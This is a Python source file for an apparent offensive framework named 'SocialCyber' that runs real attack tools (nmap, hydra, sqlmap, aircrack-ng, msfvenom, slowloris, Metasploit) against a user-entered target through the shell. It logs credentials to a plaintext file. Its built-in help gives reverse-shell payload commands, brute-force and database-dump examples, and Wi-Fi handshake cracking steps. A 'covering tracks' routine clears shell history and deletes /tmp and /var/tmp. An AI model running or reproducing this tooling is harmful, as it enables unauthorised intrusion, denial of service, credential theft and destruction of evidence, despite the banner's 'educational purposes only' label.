#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
import os
import sys
import time
import socket
import hashlib
import random
import platform
import subprocess
import requests
import threading
import getpass
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Tool information
TOOL_NAME = "SocialCyber"
VERSION = "v5.0"
AUTHOR = "Ibrahim Minister"
CONTACT = "@DarkSec"
RELEASE_DATE = "2023-12-01"
CREDS_FILE = "captured_credentials.txt"
SESSION_FILE = "active_sessions.txt"
LOG_DIR = "attack_logs"

# Create log directory if not exists
os.makedirs(LOG_DIR, exist_ok=True)

# ASCII Art Banner
BANNER = f"""{Fore.RED}
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓                                                                              ▓
▓   ███████╗ ██████╗  ██████╗██╗ █████╗ ██╗     ██╗██████╗ ███████╗██████╗    ▓
▓   ██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║     ██║██╔══██╗██╔════╝██╔══██╗   ▓
▓   ███████╗██║   ██║██║     ██║███████║██║     ██║██████╔╝█████╗  ██████╔╝   ▓
▓   ╚════██║██║   ██║██║     ██║██╔══██║██║     ██║██╔══██╗██╔══╝  ██╔══██╗   ▓
▓   ███████║╚██████╔╝╚██████╗██║██║  ██║███████╗██║██║  ██║███████╗██║  ██║   ▓
▓   ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ▓
▓                                                                              ▓
▓   ███╗   ███╗██╗███╗   ██╗██╗███████╗████████╗██████╗ ███████╗██████╗       ▓
▓   ████╗ ████║██║████╗  ██║██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗      ▓
▓   ██╔████╔██║██║██╔██╗ ██║██║███████╗   ██║   ██████╔╝█████╗  ██████╔╝      ▓
▓   ██║╚██╔╝██║██║██║╚██╗██║██║╚════██║   ██║   ██╔══██╗██╔══╝  ██╔══██╗      ▓
▓   ██║ ╚═╝ ██║██║██║ ╚████║██║███████║   ██║   ██║  ██║███████╗██║  ██║      ▓
▓   ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ▓
▓                                                                              ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
{Style.RESET_ALL}
{Fore.CYAN}┌───────────────────────────────────────────────────────────────┐
│ {Fore.MAGENTA}{TOOL_NAME} {VERSION}{Fore.CYAN} - {Fore.YELLOW}Advanced Security Framework {Fore.CYAN}                │
│ {Fore.GREEN}Developed by {AUTHOR} {Fore.CYAN}|{Fore.BLUE} Contact: {CONTACT} {Fore.CYAN}                   │
│ {Fore.RED}WARNING: For educational purposes only. Use responsibly!{Fore.CYAN}   │
└───────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}"""

# Main menu options
MAIN_MENU = [
    ["Anonymously Surf", "anon"],
    ["Information Gathering", "recon"],
    ["Credential Harvesting", "creds"],
    ["Social Media Attack", "social_attack"],
    ["Phishing Attack", "phishing"],
    ["Wireless Attack", "wireless"],
    ["Web Attack Tools", "web"],
    ["Post Exploitation", "postexp"],
    ["Payload Creator", "payload"],
    ["Exploit Frameworks", "exploit"],
    ["DDoS Attack Tools", "ddos"],
    ["Steganography", "stego"],
    ["Credential Viewer", "view_creds"],
    ["Active Sessions", "sessions"],
    ["System Cleaner", "cleaner"],
    ["Update Framework", "update"],
    ["Exit", "exit"]
]

# Module descriptions
MODULE_INFO = {
    "anon": "Tools for anonymous browsing and traffic routing",
    "recon": "Target reconnaissance and information gathering",
    "creds": "Credential harvesting and storage",
    "social_attack": "Social media exploitation and attacks",
    "phishing": "Phishing campaign management",
    "wireless": "Wireless network auditing and exploitation",
    "web": "Web application attack vectors",
    "postexp": "Post-exploitation frameworks",
    "payload": "Malware and exploit payload generation",
    "exploit": "Vulnerability exploitation frameworks",
    "ddos": "Distributed denial of service tools",
    "stego": "Steganography and data hiding",
    "view_creds": "View captured credentials",
    "sessions": "Manage active attack sessions",
    "cleaner": "System cleaning and evidence removal",
    "update": "Update or uninstall framework"
}

# Real security tools mapping
REAL_TOOLS = {
    "recon": [
        ["Nmap Scanner", "nmap", "Network discovery and security auditing"],
        ["theHarvester", "theharvester", "Gather emails, subdomains, hosts"],
        ["DNS Recon", "dnsrecon", "DNS enumeration tool"],
        ["Sublist3r", "sublist3r", "Subdomain enumeration tool"]
    ],
    "creds": [
        ["Hydra", "hydra", "Brute force attack on login credentials"],
        ["John the Ripper", "john", "Password cracking tool"],
        ["Hashcat", "hashcat", "Advanced password recovery"],
        ["Medusa", "medusa", "Parallel login brute-forcer"]
    ],
    "social_attack": [
        ["SocialFish", "socialfish", "Phishing framework"],
        ["SEToolkit", "setoolkit", "Social engineering toolkit"],
        ["Phishery", "phishery", "SSL-enabled Basic Auth phishing"],
        ["Evilginx2", "evilginx", "Man-in-the-middle phishing"]
    ],
    "phishing": [
        ["Gophish", "gophish", "Open-source phishing framework"],
        ["King Phisher", "kingphisher", "Phishing campaign toolkit"],
        ["HiddenEye", "hiddeneye", "Modern phishing tool"],
        ["Zphisher", "zphisher", "Automated phishing tool"]
    ],
    "wireless": [
        ["Aircrack-ng", "aircrack", "WiFi security auditing suite"],
        ["Kismet", "kismet", "Wireless network detector"],
        ["Wifite", "wifite", "Automated wireless attack tool"],
        ["Fern Wifi Cracker", "fern", "Wireless security auditing tool"]
    ],
    "web": [
        ["SQLMap", "sqlmap", "Automatic SQL injection tool"],
        ["Burp Suite", "burpsuite", "Web application security testing"],
        ["Nikto", "nikto", "Web server scanner"],
        ["WPScan", "wpscan", "WordPress vulnerability scanner"]
    ],
    "ddos": [
        ["Slowloris", "slowloris", "Low bandwidth DoS tool"],
        ["HULK", "hulk", "Web server DoS tool"],
        ["LOIC", "loic", "Network stress testing tool"],
        ["GoldenEye", "goldeneye", "HTTP DoS tool"]
    ],
    "stego": [
        ["Steghide", "steghide", "Data hiding in files"],
        ["Outguess", "outguess", "Universal steganography tool"],
        ["StegCracker", "stegcracker", "Steganography brute-force tool"],
        ["OpenStego", "openstego", "Steganography tool for watermarking"]
    ],
    "payload": [
        ["MSFVenom", "msfvenom", "Metasploit payload generator"],
        ["TheFatRat", "fatrat", "Payload creation tool"],
        ["Veil-Evasion", "veil", "Payload creation framework"],
        ["Shellter", "shellter", "Dynamic shellcode injector"]
    ],
    "exploit": [
        ["Metasploit", "msfconsole", "Penetration testing framework"],
        ["Searchsploit", "searchsploit", "Exploit database search"],
        ["ExploitDB", "exploitdb", "Exploit database"],
        ["AutoSploit", "autosploit", "Automated exploit tool"]
    ]
}

# Credential storage
captured_credentials = []
active_sessions = []

def clear_screen():
    """Clear terminal screen based on OS"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print the main banner"""
    clear_screen()
    print(BANNER)
    
    # Print system information
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ SYSTEM INFO ]{Fore.CYAN}─" + "─" * 34 + "┐")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}OS: {Fore.CYAN}{platform.system()} {platform.release()}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Hostname: {Fore.CYAN}{socket.gethostname()}")
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except:
        ip = "127.0.0.1"
    print(f"{Fore.YELLOW}│ {Fore.GREEN}IP Address: {Fore.CYAN}{ip}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Username: {Fore.CYAN}{getpass.getuser()}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Privileges: {Fore.CYAN}{'Root' if os.geteuid() == 0 else 'Standard'}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Credentials Captured: {Fore.RED}{len(captured_credentials)}")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Active Sessions: {Fore.RED}{len(active_sessions)}")
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")

def print_menu(title, options, cols=2):
    """Print a menu with formatted columns"""
    print(f"\n{Fore.YELLOW}┌──{Fore.CYAN}[ {Fore.MAGENTA}{title}{Fore.CYAN} ]{Fore.YELLOW}─" + "─" * (50 - len(title)) + "┐")
    
    # Calculate column width
    col_width = 50 // cols
    row_format = Fore.YELLOW + "│ " + " │ ".join(["{:<" + str(col_width - 4) + "}"] * cols) + " │"
    
    # Print menu items
    for i in range(0, len(options), cols):
        row_items = options[i:i+cols]
        # Pad row if needed
        while len(row_items) < cols:
            row_items.append("")
        print(row_format.format(*[f"{Fore.GREEN}{idx+1}.{Fore.CYAN} {item[0]}" for idx, item in enumerate(row_items)]))
    
    print(Fore.YELLOW + "└" + "─" * 50 + "┘" + Style.RESET_ALL)

def capture_credentials(service, username, password):
    """Capture and store credentials"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except:
        ip = "127.0.0.1"
    entry = {
        "timestamp": timestamp,
        "service": service,
        "username": username,
        "password": password,
        "ip": ip
    }
    captured_credentials.append(entry)
    
    # Save to file
    with open(CREDS_FILE, "a") as f:
        f.write(f"[{timestamp}] {service}: {username} / {password} from {entry['ip']}\n")
    
    return entry

def create_session(target, service, method):
    """Create a new attack session"""
    session_id = hashlib.sha256(f"{target}{time.time()}".encode()).hexdigest()[:12]
    session = {
        "id": session_id,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": target,
        "service": service,
        "method": method,
        "status": "Active",
        "log_file": os.path.join(LOG_DIR, f"{session_id}.log")
    }
    active_sessions.append(session)
    
    # Create log file
    with open(session['log_file'], "w") as f:
        f.write(f"SocialCyber Attack Session\n")
        f.write(f"Session ID: {session_id}\n")
        f.write(f"Start Time: {session['start_time']}\n")
        f.write(f"Target: {target}\n")
        f.write(f"Service: {service}\n")
        f.write(f"Method: {method}\n")
        f.write("-" * 80 + "\n")
    
    # Save to session file
    with open(SESSION_FILE, "a") as f:
        f.write(f"[{session['start_time']}] {session_id} | {target} | {service} | {method}\n")
    
    return session_id

def view_credentials():
    """View captured credentials"""
    print_banner()
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ CAPTURED CREDENTIALS ]{Fore.CYAN}─" + "─" * 22 + "┐")
    
    if not captured_credentials:
        print(f"{Fore.YELLOW}│ {Fore.RED}No credentials captured yet!")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        input(f"\n{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] Press Enter to return...")
        return
    
    for cred in captured_credentials:
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Time: {Fore.CYAN}{cred['timestamp']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Service: {Fore.RED}{cred['service']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Username: {Fore.MAGENTA}{cred['username']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Password: {Fore.MAGENTA}{cred['password']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Source IP: {Fore.CYAN}{cred['ip']}")
        print(f"{Fore.YELLOW}│ {Fore.YELLOW}─" * 48)
    
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to return...")

def view_sessions():
    """View active sessions"""
    print_banner()
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ ACTIVE SESSIONS ]{Fore.CYAN}─" + "─" * 28 + "┐")
    
    if not active_sessions:
        print(f"{Fore.YELLOW}│ {Fore.RED}No active sessions!")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        input(f"\n{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] Press Enter to return...")
        return
    
    for session in active_sessions:
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Session ID: {Fore.CYAN}{session['id']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Start Time: {Fore.CYAN}{session['start_time']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Target: {Fore.RED}{session['target']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Service: {Fore.MAGENTA}{session['service']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Method: {Fore.MAGENTA}{session['method']}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Status: {Fore.RED}{session['status']}")
        print(f"{Fore.YELLOW}│ {Fore.YELLOW}─" * 48)
    
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")
    
    # Session management options
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ SESSION MANAGEMENT ]{Fore.CYAN}─" + "─" * 24 + "┐")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}1.{Fore.CYAN} Terminate session")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}2.{Fore.CYAN} View session log")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}3.{Fore.CYAN} Export sessions")
    print(f"{Fore.YELLOW}│ {Fore.RED}0.{Fore.CYAN} Return to main menu")
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")
    
    choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select option: ")
    
    if choice == "1":
        session_id = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Enter session ID to terminate: ")
        for session in active_sessions:
            if session['id'] == session_id:
                session['status'] = "Terminated"
                print(f"{Fore.RED}[!] Session {session_id} terminated!")
                break
    elif choice == "2":
        session_id = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Enter session ID to view log: ")
        for session in active_sessions:
            if session['id'] == session_id:
                if os.path.exists(session['log_file']):
                    print(f"\n{Fore.GREEN}Session Log for {session_id}:")
                    with open(session['log_file'], "r") as f:
                        print(f.read())
                else:
                    print(f"{Fore.RED}Log file not found!")
                break
    elif choice == "3":
        with open("sessions_export.txt", "w") as f:
            for session in active_sessions:
                f.write(f"{session['id']}|{session['target']}|{session['service']}|{session['method']}|{session['status']}\n")
        print(f"{Fore.GREEN}[+] Sessions exported to sessions_export.txt")

def show_module(module):
    """Show tools for a specific module"""
    print_banner()
    print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ {module.upper()} MODULE ]{Fore.CYAN}─" + "─" * (35) + "┐")
    print(f"{Fore.YELLOW}│ {Fore.GREEN}Description: {Fore.CYAN}{MODULE_INFO.get(module, '')}")
    print(Fore.YELLOW + "├" + "─" * 50 + "┤")
    
    tools = REAL_TOOLS.get(module, [])
    if not tools:
        print(f"{Fore.YELLOW}│ {Fore.RED}No tools available for this module")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        input(f"\n{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] Press Enter to return...")
        return
    
    # Print tools in 2 columns
    col_width = 25
    row_format = Fore.YELLOW + "│ {:<2} {:<" + str(col_width) + "} │ {:<2} {:<" + str(col_width) + "} │"
    
    for i in range(0, len(tools), 2):
        tool1 = tools[i] if i < len(tools) else None
        tool2 = tools[i+1] if i+1 < len(tools) else None
        
        if tool1 and tool2:
            print(row_format.format(
                f"{i+1}.", tool1[0],
                f"{i+2}.", tool2[0]
            ))
        elif tool1:
            print(f"{Fore.YELLOW}│ {i+1}. {Fore.CYAN}{tool1[0]}{' ' * (col_width - len(tool1[0]))} │ {' ' * (col_width + 4)} │")
    
    print(Fore.YELLOW + "└" + "─" * 50 + "┘")
    
    # Tool selection
    choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select tool (1-{len(tools)}) or {Fore.RED}0{Fore.YELLOW} to return: ")
    
    if choice == '0':
        return
    
    try:
        choice_idx = int(choice) - 1
        if 0 <= choice_idx < len(tools):
            tool = tools[choice_idx]
            show_tool_info(module, tool)
    except ValueError:
        pass

def show_tool_info(module, tool):
    """Show information and options for a specific tool"""
    tool_name, tool_cmd, tool_desc = tool
    
    while True:
        print_banner()
        print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ {tool_name.upper()} ]{Fore.CYAN}─" + "─" * (50 - len(tool_name)) + "┐")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Description: {Fore.CYAN}{tool_desc}")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}Command: {Fore.MAGENTA}{tool_cmd}")
        print(Fore.YELLOW + "├" + "─" * 50 + "┤")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}1.{Fore.CYAN} Execute attack")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}2.{Fore.CYAN} Configure parameters")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}3.{Fore.CYAN} View documentation")
        print(f"{Fore.YELLOW}│ {Fore.RED}0.{Fore.CYAN} Return to module")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        
        choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select option: ")
        
        if choice == '0':
            return
        elif choice == '1':
            execute_real_attack(module, tool)
        elif choice == '2':
            configure_attack(tool)
        elif choice == '3':
            show_documentation(tool_name, tool_cmd)
        else:
            print(f"{Fore.RED}Invalid selection!")

def execute_real_attack(module, tool):
    """Execute a real attack using security tools"""
    tool_name, tool_cmd, tool_desc = tool
    target = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Enter target: ")
    session_id = create_session(target, module, tool_name)
    
    print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Launching {tool_name} against {Fore.RED}{target}{Fore.YELLOW}...")
    print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ ATTACK IN PROGRESS ]{Fore.BLUE}───")
    
    # Find session log file
    log_file = None
    for session in active_sessions:
        if session['id'] == session_id:
            log_file = session['log_file']
            break
    
    if not log_file:
        print(f"{Fore.RED}Session log file not found!")
        return
    
    # Execute the appropriate tool
    try:
        if tool_cmd == "nmap":
            scan_type = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Scan type (quick/full/vuln): ").lower()
            if scan_type == "quick":
                cmd = f"nmap -T4 -F {target}"
            elif scan_type == "full":
                cmd = f"nmap -T4 -p- {target}"
            elif scan_type == "vuln":
                cmd = f"nmap -T4 --script vuln {target}"
            else:
                cmd = f"nmap {target}"
            
            run_command(cmd, log_file)
            
        elif tool_cmd == "hydra":
            service = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Service (ssh/ftp/http): ")
            user = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Username or userlist: ")
            passlist = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Password list: ")
            cmd = f"hydra -L {user} -P {passlist} {target} {service}"
            run_command(cmd, log_file)
            
        elif tool_cmd == "sqlmap":
            url = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Vulnerable URL: ")
            cmd = f"sqlmap -u '{url}' --batch"
            run_command(cmd, log_file)
            
        elif tool_cmd == "aircrack":
            handshake = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Handshake file path: ")
            wordlist = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Wordlist path: ")
            cmd = f"aircrack-ng {handshake} -w {wordlist}"
            run_command(cmd, log_file)
            
        elif tool_cmd == "msfvenom":
            payload_type = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Payload type (windows/meterpreter/reverse_tcp): ")
            lhost = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] LHOST: ")
            lport = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] LPORT: ")
            output = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Output file: ")
            cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o {output}"
            run_command(cmd, log_file)
            print(f"{Fore.GREEN}[+] Payload created: {output}")
            
        elif tool_cmd == "slowloris":
            port = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Target port: ")
            threads = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Threads (default 100): ") or "100"
            cmd = f"slowloris {target} -p {port} -s {threads}"
            print(f"{Fore.RED}[!] Starting DDoS attack. Press Ctrl+C to stop.")
            run_command(cmd, log_file)
            
        elif tool_cmd == "setoolkit":
            print(f"{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Launching Social Engineering Toolkit...")
            run_command("setoolkit", log_file)
            
        elif tool_cmd == "msfconsole":
            print(f"{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Launching Metasploit Framework...")
            run_command("msfconsole", log_file)
            
        else:
            print(f"{Fore.RED}Tool execution not implemented yet")
            with open(log_file, "a") as f:
                f.write(f"Tool execution not implemented for {tool_name}\n")
            
        # Update session status
        for session in active_sessions:
            if session['id'] == session_id:
                session['status'] = "Completed"
                break
                
        print(f"{Fore.BLUE}│ {Fore.GREEN}[+] Attack completed successfully!")
        
    except Exception as e:
        print(f"{Fore.BLUE}│ {Fore.RED}[-] Error: {e}")
        for session in active_sessions:
            if session['id'] == session_id:
                session['status'] = "Failed"
                with open(log_file, "a") as f:
                    f.write(f"Error: {str(e)}\n")
                break
    
    print(f"{Fore.BLUE}└───{Fore.GREEN} Attack completed! {Fore.BLUE}───{Style.RESET_ALL}")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")

def run_command(cmd, log_file=None):
    """Execute a system command and log output"""
    try:
        print(f"{Fore.CYAN}Executing: {Fore.YELLOW}{cmd}")
        
        if log_file:
            with open(log_file, "a") as f:
                f.write(f"Command: {cmd}\n")
                f.write("-" * 80 + "\n")
        
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        # Capture and display output in real-time
        for line in process.stdout:
            line = line.strip()
            if line:
                print(line)
                if log_file:
                    with open(log_file, "a") as f:
                        f.write(line + "\n")
        
        process.wait()
        return process.returncode
        
    except Exception as e:
        print(f"{Fore.RED}Command execution failed: {e}")
        if log_file:
            with open(log_file, "a") as f:
                f.write(f"Command execution failed: {str(e)}\n")
        return -1

def configure_attack(tool):
    """Configure attack parameters"""
    tool_name, tool_cmd, tool_desc = tool
    
    print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Configuring {tool_name}...")
    print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ CONFIGURATION OPTIONS ]{Fore.BLUE}───")
    
    # Configuration options based on tool
    if tool_cmd == "nmap":
        print(f"{Fore.BLUE}│ {Fore.GREEN}Scan Types:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}1. Quick Scan (Top ports)")
        print(f"{Fore.BLUE}│   {Fore.CYAN}2. Full Port Scan")
        print(f"{Fore.BLUE}│   {Fore.CYAN}3. Vulnerability Scan")
        print(f"{Fore.BLUE}│   {Fore.CYAN}4. Service Version Detection")
        
    elif tool_cmd == "hydra":
        print(f"{Fore.BLUE}│ {Fore.GREEN}Common Services:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}ssh, ftp, http, http-form-post")
        print(f"{Fore.BLUE}│ {Fore.GREEN}Username Options:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}Single user: admin")
        print(f"{Fore.BLUE}│   {Fore.CYAN}User list: /path/to/users.txt")
        print(f"{Fore.BLUE}│ {Fore.GREEN}Password Options:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}Single password: password123")
        print(f"{Fore.BLUE}│   {Fore.CYAN}Password list: /path/to/passwords.txt")
        
    elif tool_cmd == "sqlmap":
        print(f"{Fore.BLUE}│ {Fore.GREEN}Common Parameters:")
        print(f"{Fore.BLUE}│   {Fore.CYAN}--dbs: Enumerate databases")
        print(f"{Fore.BLUE}│   {Fore.CYAN}--tables: Enumerate tables")
        print(f"{Fore.BLUE}│   {Fore.CYAN}--columns: Enumerate columns")
        print(f"{Fore.BLUE}│   {Fore.CYAN}--dump: Dump database contents")
        
    else:
        print(f"{Fore.BLUE}│ {Fore.RED}No specific configuration for this tool")
    
    print(f"{Fore.BLUE}└───{Fore.GREEN} Configuration saved! {Fore.BLUE}───{Style.RESET_ALL}")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")

def show_documentation(tool_name, tool_cmd):
    """Show tool documentation"""
    print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] {tool_name} Documentation:")
    print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ TOOL DOCUMENTATION ]{Fore.BLUE}───")
    
    docs = {
        "nmap": [
            "Nmap - Network Mapper",
            "Usage:",
            "  nmap [scan type] [options] {target}",
            "Common Scan Types:",
            "  -sS: TCP SYN scan",
            "  -sU: UDP scan",
            "  -O: OS detection",
            "  -A: Aggressive scan",
            "  --script: Run NSE scripts",
            "Examples:",
            "  nmap -sS -sV -O target.com",
            "  nmap -p 80,443 192.168.1.0/24",
            "  nmap --script vuln target.com"
        ],
        "hydra": [
            "Hydra - Parallelized Login Cracker",
            "Usage:",
            "  hydra -l user -P passlist.txt {service}://{target}",
            "  hydra -L userlist.txt -p password {service}://{target}",
            "Common Services:",
            "  ssh, ftp, http, http-form-post, smb, rdp",
            "Examples:",
            "  hydra -l admin -P passwords.txt ssh://192.168.1.1",
            "  hydra -L users.txt -p 'Password123' http-get://target.com/login",
            "  hydra -t 32 -f http-form-post://target.com/login.php:user=^USER^&pass=^PASS^:F=incorrect"
        ],
        "sqlmap": [
            "sqlmap - Automatic SQL Injection Tool",
            "Usage:",
            "  sqlmap -u 'http://target.com/page.php?id=1' [options]",
            "Common Options:",
            "  --dbs: Enumerate databases",
            "  -D DB: Specify database",
            "  --tables: List tables",
            "  -T TBL: Specify table",
            "  --columns: List columns",
            "  -C COL: Specify columns",
            "  --dump: Dump table contents",
            "Examples:",
            "  sqlmap -u 'http://target.com/page.php?id=1' --dbs",
            "  sqlmap -u 'http://target.com/page.php?id=1' -D dbname --tables",
            "  sqlmap -u 'http://target.com/page.php?id=1' -D dbname -T users --dump"
        ],
        "aircrack": [
            "Aircrack-ng - WiFi Security Suite",
            "Usage:",
            "  airmon-ng start wlan0",
            "  airodump-ng wlan0mon",
            "  airodump-ng -c CH -bssid BSSID -w capture wlan0mon",
            "  aireplay-ng -0 10 -a BSSID wlan0mon",
            "  aircrack-ng -w wordlist.txt capture.cap",
            "Steps:",
            "  1. Put interface in monitor mode",
            "  2. Capture handshake with airodump-ng",
            "  3. Deauth clients to capture handshake",
            "  4. Crack handshake with aircrack-ng"
        ],
        "msfvenom": [
            "MSFVenom - Metasploit Payload Generator",
            "Usage:",
            "  msfvenom -p PAYLOAD LHOST=IP LPORT=PORT [options]",
            "Common Payloads:",
            "  windows/meterpreter/reverse_tcp",
            "  linux/x86/meterpreter/reverse_tcp",
            "  android/meterpreter/reverse_tcp",
            "  php/meterpreter/reverse_tcp",
            "Options:",
            "  -f: Format (exe, raw, php, asp, etc)",
            "  -o: Output file",
            "  -e: Encoder (x86/shikata_ga_nai)",
            "Examples:",
            "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o payload.exe",
            "  msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R > payload.apk"
        ],
        "slowloris": [
            "Slowloris - Layer 7 DDoS Tool",
            "Usage:",
            "  slowloris [options] target",
            "Options:",
            "  -p PORT: Target port (default 80)",
            "  -s SOCKETS: Number of sockets (default 150)",
            "  -v: Verbose mode",
            "  -t TIMEOUT: Timeout in seconds (default 15)",
            "Examples:",
            "  slowloris target.com",
            "  slowloris -p 443 -s 500 target.com"
        ],
        "default": [
            f"{tool_name} Documentation",
            "For detailed documentation:",
            f"  man {tool_cmd}",
            f"  {tool_cmd} --help",
            "Online Resources:",
            "  https://www.kali.org/tools/",
            "  https://tools.kali.org/",
            "  https://www.offensive-security.com/metasploit-unleashed/"
        ]
    }
    
    doc_lines = docs.get(tool_cmd, docs["default"])
    for line in doc_lines:
        print(f"{Fore.BLUE}│ {Fore.CYAN}{line}")
    
    print(f"{Fore.BLUE}└───{Fore.GREEN} End of documentation {Fore.BLUE}───{Style.RESET_ALL}")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")

def clean_system():
    """Clean system to remove evidence"""
    print(f"\n{Fore.YELLOW}[{Fore.RED}*{Fore.YELLOW}] Cleaning system to remove evidence...")
    print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ SYSTEM CLEANING ]{Fore.BLUE}───")
    
    steps = [
        "Clearing command history",
        "Removing temporary files",
        "Wiping log files",
        "Clearing cache",
        "Securely deleting evidence",
        "Covering tracks"
    ]
    
    for i, step in enumerate(steps):
        time.sleep(0.8)
        progress = (i+1) * 16
        print(f"{Fore.BLUE}│ {Fore.YELLOW}[{progress}%] {step}...")
    
    # Actual cleaning commands
    os.system("history -c")
    os.system("rm -rf /tmp/* /var/tmp/*")
